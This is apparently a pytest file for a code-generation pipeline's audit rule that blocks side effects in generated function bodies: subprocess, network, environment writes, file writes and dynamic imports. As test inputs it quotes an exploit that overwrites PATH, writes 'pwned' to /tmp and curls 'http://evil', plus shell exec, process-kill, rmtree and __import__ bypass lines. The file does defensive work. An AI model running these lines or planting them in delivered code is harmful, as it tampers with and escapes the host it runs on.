"""Audit rule S17.5: the function BODY lives in a closed effect world.

Node H6 (`body-side-effects`, plan 2026-07-04T00-45) — finding F2 of the
three-principles audit, PROVEN EMPIRICALLY before this file existed:

    a delivered body doing `os.environ['PATH'] = '/evil'`,
    `open('/tmp/evil', 'w').write('pwned')` and
    `subprocess.run(['curl', 'http://evil'])`
    passed `spec_skeletons.skeleton_conformance` with ZERO findings —
    stdlib imports are blanket-allowed and no rule looked INSIDE the body.

The skeleton door (S17.2) closed the import world and the public surface,
but the body itself could still touch every observable seam of the host:
spawn processes, open sockets, mutate the process environment, write
arbitrary files. Every door let it through silently.

The rule, by construction (AST, no prompt hope):

  * `spec_skeletons.body_effect_findings(tree, node_id=..., allowed=...)`
    — ONE shared checker: effectful stdlib surfaces in a body are findings
    unless the node DECLARES them. Effect classes (the declarable datum
    values): `subprocess` (subprocess module, os.system/exec*/spawn*/
    fork/kill/popen), `network` (socket, ssl, urllib.request, http.client,
    ftplib, smtplib, socketserver, ...), `env-write` (os.environ mutation,
    os.putenv/unsetenv), `fs-write` (open() in write/append/create or
    unprovable mode, pathlib write methods, os file mutations, shutil,
    tempfile), `dynamic-import` (__import__, importlib — the trivial
    bypass of BOTH closed worlds).
  * The node's IR entry MAY carry an optional `effects` list naming the
    classes it is contracted to perform; ABSENT = DENY ALL. (The spec_ir
    `_NODE_KEYS` addition is the coordinator's one-line schema change;
    every test here builds hand IR and passes with the key absent.)
  * READ IS ALLOWED, WRITE IS DENIED: `open(path)` / `open(path, 'r')` is
    green — a read mutates nothing observable and leaf modules
    legitimately read their own workspace data files; any mode carrying
    w/a/x/+ or a mode the AST cannot prove read-only is a finding.
    Env READS (`os.environ.get`, `os.environ['X']` in load context) stay
    green — the engine skeleton itself instructs them (C1 env anchors).
  * `skeleton_conformance` runs the checker on every judged delivery —
    refusal path is the EXISTING delivery-lint refusal (S17.3, one door).
  * The doctor's repair door (`spec_flow_doctor.apply_function_body`)
    runs the SAME checker on the spliced reply body — a repair reply is
    exactly as body-shaped as a delivery and was the second silent hole
    (`open('/tmp/evil','w')` needs no import, so the module-shape refusal
    never fired).

GREEN direction (the v151 false-positive lesson): the honest corpus stays
clean — bodies-only deliveries, json/datetime/uuid/math/re helpers,
`sqlite3.connect(os.environ['NOTES_DB'])` (the contracted persistence
seam), env reads. Engine-synthesized code (router template, entry) never
reaches this door: `_ir_skeleton_for` refuses to register the product
entry (S17.3) and unregistered files pass untouched.

Deterministic: pure functions over hand IR, no engine, no LLM.
"""
from __future__ import annotations

import pathlib
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2]))
import spec_skeletons  # noqa: E402
from spec_flow_doctor import apply_function_body  # noqa: E402


# ── hand IR in the exact spec_ir.build_ir shape ──────────────────────────────

def _node(effects=None):
    node = {
        "files": ["src/core.py"],
        "openapi": {
            "openapi": "3.1.0",
            "info": {"title": "spec-flow node core interface",
                     "version": "1"},
            "paths": {"/notes": {
                "post": {
                    "x-spec-flow-handler": "post_notes",
                    "responses": {"201": {
                        "description": "contracted success response",
                        "content": {"application/json": {"schema": {}}}}}},
                "get": {
                    "x-spec-flow-handler": "get_notes",
                    "responses": {"200": {
                        "description": "contracted success response",
                        "content": {"application/json": {
                            "schema": {}}}}}}}}},
        "symbols": {
            "exposes": [
                {"name": "post_notes", "args": ["payload", "query"]},
                {"name": "get_notes", "args": ["payload", "query"]}],
            "consumes": [{"from": "db", "name": "connect",
                          "args": ["path"]}]},
        "env": [{"name": "NOTES_DB", "rule": "path to the sqlite file"}],
    }
    if effects is not None:
        node["effects"] = list(effects)
    return node


def _ir(effects=None):
    return {"format": "spec-flow ir v1", "product": {},
            "nodes": {"core": _node(effects)}}


def _delivery(body_lines, effects=None, extra=""):
    """A conforming bodies-only delivery whose post_notes body is ours."""
    code = ("from db import connect\n\n\n"
            "def post_notes(payload, query):\n"
            + "".join("    %s\n" % ln for ln in body_lines)
            + "\n\ndef get_notes(payload, query):\n"
            "    return 200, {'items': []}\n")
    return code + extra


def _findings(code, effects=None):
    return spec_skeletons.skeleton_conformance(_ir(effects), "core", code)


# ── RED: the proven F2 exploit ───────────────────────────────────────────────

def test_f2_exploit_effectful_body_is_refused():
    """The auditor's literal exploit — three observable side effects in a
    conforming body — must produce findings for EVERY effect class."""
    code = ("import os\nimport subprocess\n" + _delivery([
        "os.environ['PATH'] = '/evil'",
        "open('/tmp/evil', 'w').write('pwned')",
        "subprocess.run(['curl', 'http://evil'])",
        "return 201, {'id': 1}"]))
    fnd = _findings(code)
    text = "\n".join(fnd)
    assert fnd, "the F2 exploit passed with ZERO findings — the hole is open"
    for cls in ("env-write", "fs-write", "subprocess"):
        assert cls in text, (
            "effect class %r missing from findings: %r" % (cls, fnd))


def test_findings_name_node_symbol_and_class():
    code = "import subprocess\n" + _delivery(
        ["subprocess.run(['id'])", "return 201, {'id': 1}"])
    fnd = _findings(code)
    assert any("core" in f and "subprocess" in f for f in fnd), (
        "a finding must name the node, the symbol and the effect class "
        "(the phantom-import attribution style): %r" % fnd)


def test_declared_effects_suppress_their_class_only():
    """`effects: [fs-write]` legalises the file write and NOTHING else."""
    code = "import subprocess\n" + _delivery([
        "open('out.txt', 'w').write('data')",
        "subprocess.run(['id'])",
        "return 201, {'id': 1}"])
    fnd = _findings(code, effects=["fs-write"])
    text = "\n".join(fnd)
    assert "fs-write" not in text, (
        "a DECLARED effect class is contracted — no finding: %r" % fnd)
    assert "subprocess" in text, (
        "an UNDECLARED class stays refused even next to a declared one: "
        "%r" % fnd)


def test_absent_effects_key_means_deny():
    """The schema key is optional; ABSENT = deny — the safe default the
    coordinator's spec_ir _NODE_KEYS addition must not change."""
    code = "import shutil\n" + _delivery(
        ["shutil.rmtree('data')", "return 201, {'id': 1}"])
    assert any("fs-write" in f for f in _findings(code)), (
        "no `effects` key in the node entry must mean DENY ALL")


# ── read/write line: reads are green, writes are findings ────────────────────

def test_read_only_open_is_green():
    code = _delivery([
        "data = open('seed.json').read()",
        "more = open('seed.txt', 'r').read()",
        "return 201, {'id': len(data) + len(more)}"])
    assert _findings(code) == [], (
        "read-only open() mutates nothing observable — leaf modules may "
        "read their own workspace data files")


def test_write_append_create_modes_are_findings():
    for mode in ("w", "a", "x", "r+", "wb", "ab"):
        code = _delivery(["open('f', %r).write('d')" % mode,
                          "return 201, {'id': 1}"])
        assert any("fs-write" in f for f in _findings(code)), (
            "open(..., %r) is an observable write — a finding" % mode)


def test_unprovable_open_mode_is_a_finding():
    """A variable mode cannot be proven read-only — closed world denies."""
    code = _delivery(["m = query.get('m', 'r')",
                      "open('f', m)",
                      "return 201, {'id': 1}"])
    assert any("fs-write" in f for f in _findings(code)), (
        "a mode the AST cannot prove read-only must be denied")


def test_env_read_green_env_write_findings():
    green = "import os\n" + _delivery([
        "path = os.environ['NOTES_DB']",
        "alt = os.environ.get('NOTES_DB', '')",
        "return 201, {'id': 1}"])
    assert _findings(green) == [], (
        "env READS are the engine-instructed access pattern (C1 anchors)")
    for stmt in ("os.environ['X'] = 'v'",
                 "del os.environ['X']",
                 "os.environ.pop('X', None)",
                 "os.environ.update({'X': 'v'})",
                 "os.putenv('X', 'v')"):
        code = "import os\n" + _delivery([stmt, "return 201, {'id': 1}"])
        assert any("env-write" in f for f in _findings(code)), (
            "%s is an observable env mutation — a finding" % stmt)


# ── the other effect classes ─────────────────────────────────────────────────

def test_network_surfaces_are_findings():
    for line, imp in (
            ("socket.socket()", "import socket"),
            ("urllib.request.urlopen('http://evil')",
             "import urllib.request"),
            ("http.client.HTTPConnection('evil')", "import http.client"),
            ("urlopen('http://evil')", "from urllib.request import urlopen"),
            ("request.urlopen('http://evil')", "from urllib import request")):
        code = imp + "\n" + _delivery([line, "return 201, {'id': 1}"])
        assert any("network" in f for f in _findings(code)), (
            "%r must be a network finding" % imp)


def test_urllib_parse_is_green():
    code = ("from urllib.parse import quote\n" + _delivery(
        ["return 201, {'id': quote('a b')}"]))
    assert _findings(code) == [], (
        "urllib.parse is pure computation — only urllib.request is the "
        "network surface")


def test_process_controls_via_os_are_findings():
    for stmt in ("os.system('id')", "os.execv('/bin/sh', ['sh'])",
                 "os.spawnl(0, '/bin/sh')", "os.popen('id')",
                 "os.kill(1, 9)"):
        code = "import os\n" + _delivery([stmt, "return 201, {'id': 1}"])
        assert any("subprocess" in f for f in _findings(code)), (
            "%s is process control — the subprocess class" % stmt)


def test_os_fs_mutations_are_findings():
    for stmt in ("os.remove('f')", "os.rename('a', 'b')",
                 "os.mkdir('d')", "os.makedirs('d/e')", "os.chmod('f', 0)"):
        code = "import os\n" + _delivery([stmt, "return 201, {'id': 1}"])
        assert any("fs-write" in f for f in _findings(code)), (
            "%s mutates the filesystem — the fs-write class" % stmt)


def test_shutil_and_tempfile_are_fs_write():
    for imp in ("import shutil", "import tempfile",
                "from shutil import rmtree",
                "from tempfile import NamedTemporaryFile"):
        code = imp + "\n" + _delivery(["return 201, {'id': 1}"])
        assert any("fs-write" in f for f in _findings(code)), (
            "%r reaches the filesystem-mutation surface — a finding even "
            "unused (the import IS the capability)" % imp)


def test_pathlib_write_methods_are_findings():
    for stmt in ("pathlib.Path('f').write_text('d')",
                 "pathlib.Path('f').write_bytes(b'd')",
                 "pathlib.Path('d').mkdir()",
                 "pathlib.Path('f').unlink()",
                 "pathlib.Path('f').touch()"):
        code = "import pathlib\n" + _delivery(
            [stmt, "return 201, {'id': 1}"])
        assert any("fs-write" in f for f in _findings(code)), (
            "%s is a pathlib write — the fs-write class" % stmt)


def test_str_replace_is_not_a_pathlib_false_positive():
    code = _delivery(["t = 'a-b'.replace('-', '_')",
                      "return 201, {'id': t}"])
    assert _findings(code) == [], (
        "str.replace shares its name with Path.replace — method-name "
        "matching must not flag it (the v151 false-positive lesson)")


def test_dynamic_import_bypass_is_closed():
    """__import__/importlib defeat BOTH closed worlds (imports + effects);
    the door must name them."""
    for stmt, imp in (
            ("__import__('subprocess').run(['id'])", ""),
            ("importlib.import_module('subprocess')", "import importlib\n")):
        code = imp + _delivery([stmt, "return 201, {'id': 1}"])
        assert any("dynamic-import" in f for f in _findings(code)), (
            "%s bypasses the closed import world — a finding" % stmt)


# ── GREEN calibration: the honest corpus stays clean ─────────────────────────

def test_green_corpus_stays_clean():
    """The legitimate leaf vocabulary — pure stdlib computation plus the
    contracted sqlite3-over-env persistence seam — yields ZERO findings."""
    code = ("import datetime\nimport json\nimport math\nimport os\n"
            "import re\nimport sqlite3\nimport uuid\n"
            "from db import connect\n\n\n"
            "def post_notes(payload, query):\n"
            "    conn = sqlite3.connect(os.environ['NOTES_DB'])\n"
            "    nid = str(uuid.uuid4())\n"
            "    ts = datetime.datetime.now().isoformat()\n"
            "    ok = re.match(r'\\w+', json.dumps(payload or {}))\n"
            "    return 201, {'id': nid, 'ts': ts,\n"
            "                 'n': math.floor(1.5) if ok else 0}\n\n\n"
            "def get_notes(payload, query):\n"
            "    connect(os.environ.get('NOTES_DB', ''))\n"
            "    return 200, {'items': []}\n")
    assert _findings(code) == [], (
        "the honest green vocabulary must pass untouched — a false "
        "positive here sinks real runs (v151)")


def test_node_without_ir_entry_stays_inert():
    assert spec_skeletons.skeleton_conformance(
        _ir(), "ghost", "import subprocess\n") == [], (
        "no IR entry -> no skeleton -> the gate stays inert (fallback)")


# ── the doctor's repair door shares the checker ──────────────────────────────

_MODULE = ("from db import connect\n\n\n"
           "def post_notes(payload, query):\n"
           "    # AICODE-NOTE: skeleton-contract post_notes POST /notes\n"
           "    raise NotImplementedError\n\n\n"
           "def get_notes(payload, query):\n"
           "    return 200, {'items': []}\n")


def test_doctor_door_refuses_effectful_repair_body():
    """`open('/tmp/evil','w')` needs NO import, so the module-shape refusal
    never fired — the repair door was the second silent F2 hole."""
    with pytest.raises(ValueError):
        apply_function_body(_MODULE, "post_notes",
                            "open('/tmp/evil', 'w').write('pwned')\n"
                            "return 201, {'id': 1}")


def test_doctor_door_refuses_dunder_import_repair_body():
    with pytest.raises(ValueError):
        apply_function_body(_MODULE, "post_notes",
                            "__import__('subprocess').run(['id'])\n"
                            "return 201, {'id': 1}")


def test_doctor_door_green_repair_still_lands():
    out = apply_function_body(_MODULE, "post_notes",
                              "return 201, {'id': len(str(payload))}")
    assert "return 201, {'id': len(str(payload))}" in out


def test_doctor_door_read_only_repair_still_lands():
    out = apply_function_body(_MODULE, "post_notes",
                              "data = open('seed.json').read()\n"
                              "return 201, {'id': len(data)}")
    assert "open('seed.json').read()" in out


def test_doctor_door_declared_effects_allow():
    """The caller that HAS the node's declared effects may pass them —
    the same optional datum, the same deny default."""
    out = apply_function_body(_MODULE, "post_notes",
                              "open('out.txt', 'w').write('d')\n"
                              "return 201, {'id': 1}",
                              allowed_effects=("fs-write",))
    assert "open('out.txt', 'w')" in out
